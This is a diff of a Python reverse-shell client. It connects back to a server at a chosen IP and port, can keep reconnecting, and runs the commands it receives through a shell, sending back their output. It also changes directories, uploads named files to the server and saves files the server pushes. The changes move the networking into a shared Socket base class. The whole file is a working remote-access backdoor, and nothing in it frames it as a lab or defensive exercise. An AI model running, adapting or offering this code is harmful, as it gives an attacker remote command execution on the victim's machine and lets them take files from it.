@@ -1,30 +1,31 @@
 import socket
-import os
 import subprocess
 import sys, argparse
 import shlex
+from Socket import Socket
+import os
 
 
-class Client:
-    def __init__(self, ip, port, verbose=True, loop=False, bufsz=8138):
+class Client(Socket):
+    def __init__(self, ip, port, verbose=True, loop=False):
+        super().__init__(ip, port, 4096)
         self.ip = ip
-        self.port = port
-        self.sock = socket.socket()
         self.loop = loop
         self.verbose = verbose
-        self.bufsz = bufsz
+        self.command_buffer = ''
+        self.receiving_file = None
 
     def run(self):
         if self.loop:
             while True:
                 if self.__connect():
                     self.__shell()
-                    self.sock = socket.socket()
         else:
             if self.__connect():
                 self.__shell()
 
     def __connect(self):
+        self.sock = socket.socket()
         try:
             if self.verbose:
                 print("Attempting to connect ", (self.ip + ':' + str(self.port)))
@@ -43,40 +44,14 @@ class Client:
                 print("->", end='')
             return True
 
-    def save_files(self, files):
-        files = files.split(b"FILE_END")[:-1]
-        for file in files:
-            try:
-                file = file.split(b"NAME")
-                with open(file[0].decode("utf-8"), "wb") as f:
-                    f.write(file[1])
-            except Exception as e:
-                if self.verbose:
-                    print(e)
-                else:
-                    continue
-
-    def parse_files(self, file_names):
-        files = b''
-        for file in file_names:
-            try:
-                with open(file, "rb") as read_object:
-                    files += file.encode() + b'NAME' + read_object.read() + b'FILE_END'
-            except Exception as e:
-                if self.verbose:
-                    print(e)
-                    print("Error uploading", file)
-        return b"FILES" + files + b"->"
-
     def change_dir(self, path):
-        return_string = b''
+        return_string = ''
         try:
             path = path.replace("~", os.path.expanduser("~"))
             os.chdir(path)
         except Exception as e:
-            err = str(e) + '\n'
-            return_string += str(err).encode()
-        return_string += (str(os.getcwd()) + "->").encode()
+            return_string += str(e) + '\n'
+        return_string += os.getcwd()
         return return_string
 
     def console(self, command):
@@ -85,58 +60,52 @@ class Client:
             shell=True,
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
+            stderr=subprocess.PIPE,
+            text=True
         )
         stdout, stderr = cmd.communicate()
-        output = b''
+        output = ''
         if stdout:
             output += stdout
         if stderr:
             output += stderr
-        output += (str(os.getcwd()) + "->").encode()
+        output += os.getcwd()
         return output
+
+    def handle_data(self, data):
+        if self.receiving_file is not None:
+            with open(os.path.join(os.getcwd(), self.receiving_file), 'ab') as f:
+                f.write(data)
+        if data[:len(b"SENDING_FILE:")] == b"SENDING_FILE:":
+            self.receiving_file = data[len(b"SENDING_FILE:"):].decode("utf-8")
+        else:
+            self.command_buffer += data.decode("utf-8")
 
     def __shell(self):
         while True:
             try:
-                received = self.sock.recv(self.bufsz)
-                if received[:len(b"FILES")] == b"FILES":
-                    while received[-1*len(b"CONN_END"):] != b"CONN_END":
-                        received += self.sock.recv(self.bufsz)
-                    self.save_files(received[len(b"FILES"):-1*len(b"CONN_END")])
-                    self.sock.send((str(os.getcwd()) + "->").encode())
-                    continue
-                else:
-                    command = received.decode("utf-8")
-                if self.verbose:
-                    print(command)
-                response = ''.encode()
-                if len(command) == 0:
-                    continue
-                elif command == "exit":
+                self.command_buffer = ''
+                self.sink(self.sock, self.handle_data)
+
+                if self.receiving_file is not None:
                     if self.verbose:
-                        print("\nConnection closed by server.")
-                    self.sock.close()
-                    return
-                elif command.strip()[:7].lower() == "receive":
-                    file_names = shlex.split(command)[1:]
-                    response += self.parse_files(file_names)
-                elif command.strip()[:2] == "cd":
-                    response += self.change_dir(shlex.split(command)[1])
-                else:
-                    response += self.console(command)
-                if len(response) > 0:
-                    self.sock.send(response)
+                        print(f"Received {self.receiving_file} from server")
+                    self.receiving_file = None
+                    self.source(self.sock, self.yield_data("File received by client!"))
+                    continue
+
                 if self.verbose:
-                    try:
-                        print(response.decode("utf-8"))
-                    except UnicodeDecodeError:
-                        lines = response.split(b'\n')
-                        for line in lines:
-                            if line == lines[-1]:
-                                print(line, end='')
-                            else:
-                                print(line)
+                    print(self.command_buffer)
+
+                if len(self.command_buffer) == 0:
+                    self.source(self.sock, self.yield_data("Empty command received by client!"))
+                if self.command_buffer[:7] == "receive":
+                    self.source(self.sock, self.yield_file(shlex.split(self.command_buffer)[1]))
+                elif self.command_buffer[:2] == "cd":
+                    self.source(self.sock, self.yield_data(self.change_dir(
+                        shlex.split(self.command_buffer)[1])))
+                else:
+                    self.source(self.sock, self.yield_data(self.console(self.command_buffer)))
             except ConnectionResetError:
                 if self.verbose:
                     print("\nServer shut down.")
@@ -168,3 +137,4 @@ if __name__ == '__main__':
     if args.loop:
         loop = True
     Client(args.ip, args.port, verbose, loop).run()
+    # Client("localhost", 41369, True, True).run()
